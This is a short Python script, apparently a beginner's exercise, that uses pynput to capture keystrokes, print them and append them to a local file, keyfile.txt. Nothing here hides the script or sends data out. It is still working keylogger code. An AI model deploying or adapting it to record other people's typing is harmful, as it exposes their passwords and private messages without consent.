from pynput import keyboard

#Install pynput by using "pip install pynput OR py -m pip install pynput"#
#pynput is a module used to capture key events from users#

def keyPressed(key): #function is defined with parameter key, N.B onpress automatically passes "key"#
    print(str(key)) #shows myself what is happening#
    with open("keyfile.txt", 'a') as logKey: #to record strokes, file "keyfile" is created or opened and strokes are appended ('a'). logkey is used to refrence#
        try: #With try, we are converting keys to characters to put into files#
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char") #let's me know there is an error#

if __name__ == "__main__":           #method used to carry out actions when program launches. Below is what I want the method to do#
    listener = keyboard.Listener(on_press=keyPressed) #Listener object mimics keystrokes, onpress sends theevent to the method "keyPressed"#
    listener.start() #listener object is activated#
    input() #keystrokes captured here#

